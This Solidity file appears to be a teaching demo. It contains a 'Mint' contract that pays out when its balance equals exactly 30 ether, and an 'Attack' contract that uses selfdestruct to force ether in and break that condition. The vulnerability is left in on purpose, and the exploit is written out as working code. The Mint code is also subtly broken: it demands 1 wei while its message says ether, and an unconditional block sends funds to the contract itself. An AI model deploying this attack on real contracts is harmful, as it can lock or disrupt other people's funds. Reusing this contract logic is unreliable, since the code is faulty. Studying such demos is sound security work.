  // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // using selfDestruct function . 

contract Mint {

      address payable last_minter ; 
      uint public target = 30 ether;
      receive ()external payable{}
      function DepositEther () public payable {
            require( msg.value==1 ,"you can not deposit morethan 1");
            uint balance = address(this).balance;
            if(balance==target){
                last_minter=payable(msg.sender);
            }{
                payable(address(this)).transfer(msg.value);
            }
           
      }

      function WithdrawEther () external payable{
        require(msg.sender==last_minter);
        (bool success, )=last_minter.call{value:address(this).balance}("");
         require(success, "Transaction failed");
      }  
}

contract Attack{
      Mint Bad_minter;

      constructor( Mint _minter) {
         Bad_minter=_minter;
      }
      function spoiler() public payable {
          address payable mint_address=payable(address(Bad_minter));
          selfdestruct(mint_address);
      }
       
}